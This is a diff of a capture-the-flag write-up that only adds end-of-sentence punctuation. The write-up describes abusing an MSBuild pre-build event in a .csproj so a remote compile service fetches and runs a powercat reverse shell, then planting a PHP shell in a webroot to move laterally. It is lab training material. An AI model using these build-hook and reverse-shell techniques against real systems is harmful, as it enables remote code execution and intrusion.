@@ -63,16 +63,16 @@ This will generate a new folder called `myapp` containing a project file called 
 > dotnet sln repo.sln add myapp/myapp.csproj
 Project `myapp/myapp.csproj` added to the solution.
 ```
-Once visual studio part is finished, we need to initialize a git repository in the `repo` directory and serve it via http. For this, firstly initialize the git repo on directory `repo`
+Once visual studio part is finished, we need to initialize a git repository in the `repo` directory and serve it via http. For this, firstly initialize the git repo on directory `repo`.
 ```markdown
 > cd repo
 > git init
 ```
-The directory `repo/.git` is created after this. The `.git` directory contains the repo files and metadata. Next step is to add all files on the `repo` directory to the git
+The directory `repo/.git` is created after this. The `.git` directory contains the repo files and metadata. Next step is to add all files on the `repo` directory to the git.
 ```markdown
 > git add .
 ```
-Check there no more untracked files in the git repo to be added
+Check there no more untracked files in the git repo to be added.
 ```markdown
 > git status
 On branch master
@@ -90,7 +90,7 @@ Changes to be committed:
         new file:   myapp/obj/project.nuget.cache
         new file:   repo.sln
 ```
-Commit changes
+Commit changes.
 ```markdown
 > git commit -m 'first commit'
 
@@ -104,11 +104,11 @@ Commit changes
  create mode 100644 myapp/obj/project.nuget.cache
  create mode 100644 repo.sln
 ```markdown
-Finally, move to .git directory and update server info
+Finally, move to .git directory and update server info.
 ```markdown
 > git update-server-info
 ```
-Now the git is ready to be served on http. We can test it, move to `.git` and serve the repo with a python http server. Then, in the web app, enter the local machine ip. Shortly after, the app starts downloading the c# files and uploading them into the server. Once they are conmplied, they are stored in a random folder and the app supplies the user with the resulting url 
+Now the git is ready to be served on http. We can test it, move to `.git` and serve the repo with a python http server. Then, in the web app, enter the local machine ip. Shortly after, the app starts downloading the c# files and uploading them into the server. Once they are conmplied, they are stored in a random folder and the app supplies the user with the resulting url.
 ```markdown
 > cd .git 
                                                                                                                                  
@@ -135,7 +135,7 @@ Keyboard interrupt received, exiting.
 
 ![visual2](https://github.com/g1vi/Write-up/assets/120142960/30e914ad-fd62-4141-a0bb-3f3cb841d533)
 
-Once we are sure our git repo works, we have to find a way to make the server execute the code after compiling it. This can be done manipulating pre and post events in the c# `.csproj` project file. These events are triggered by the msbuild compiler before or after the compiling process ends. We will add a pre event, calling a powercat reverse shell before the building process begins. Just create any simple Program.cs source file and, in the `myapp.csproj` file, add the pre event
+Once we are sure our git repo works, we have to find a way to make the server execute the code after compiling it. This can be done manipulating pre and post events in the c# `.csproj` project file. These events are triggered by the msbuild compiler before or after the compiling process ends. We will add a pre event, calling a powercat reverse shell before the building process begins. Just create any simple Program.cs source file and, in the `myapp.csproj` file, add the pre event.
 ```markdown
 <Project Sdk="Microsoft.NET.Sdk">
 
@@ -152,7 +152,7 @@ Once we are sure our git repo works, we have to find a way to make the server ex
 
 </Project>
 ```
-After this, add again all files to git, commit, update server info and restart the python http server (from .git directory)
+After this, add again all files to git, commit, update server info and restart the python http server (from .git directory).
 ```markdown
 > cd repo
 > git add .
@@ -161,7 +161,7 @@ After this, add again all files to git, commit, update server info and restart t
 > git update-server-info
 > python3 -m http.server 80
 ```
-Start another python http serving powercat.ps1 and start a listener. Enter red box ip in the web app url box, after the c# files are pulled and processed, a reverse shell is received on port 1919
+Start another python http serving powercat.ps1 and start a listener. Enter red box ip in the web app url box, after the c# files are pulled and processed, a reverse shell is received on port 1919.
 <br>
 <br>
 ### PHASE 3. System
@@ -187,7 +187,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeCreateGlobalPrivilege       Create global objects          Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 ```
-After enumeration, we discover we have write access to webroot folder so if we copy a .php shell in the webroot, we could move laterally to the user who is running the web server. Let's check who is running the http service
+After enumeration, we discover we have write access to webroot folder so if we copy a .php shell in the webroot, we could move laterally to the user who is running the web server. Let's check who is running the http service.
 ```markdown
 > wmic service where started=true get name,startname
 
